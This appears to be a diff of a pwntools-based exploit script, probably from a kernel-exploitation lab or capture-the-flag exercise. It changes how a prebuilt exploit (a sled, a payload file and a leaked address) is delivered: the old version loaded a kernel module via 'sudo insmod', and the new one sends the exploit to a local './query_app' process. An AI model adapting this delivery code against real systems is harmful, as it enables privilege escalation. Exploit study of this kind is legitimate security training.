@@ -186,10 +186,11 @@ def attack_kernel(target_binary, payload_file, sled_length):
     exploit = create_exploit(target_binary, payload_file, sled_length, leak)
     exploit_length = len(exploit)
     exploit = bytes(exploit).hex()
-    args = ['sudo', 'insmod', 'vbox3.ko', 'exploit_payload="'+exploit+'"',
-        'exploit_length="'+str(exploit_length)+'"']
+    args = ['./query_app']
     print(args)
-    print(process(args).recvall())
+    p = process(args)
+    print('sending exploit', p.send(exploit))
+    print(p.recvall())
 
 def main():
     # Set the pwntools context
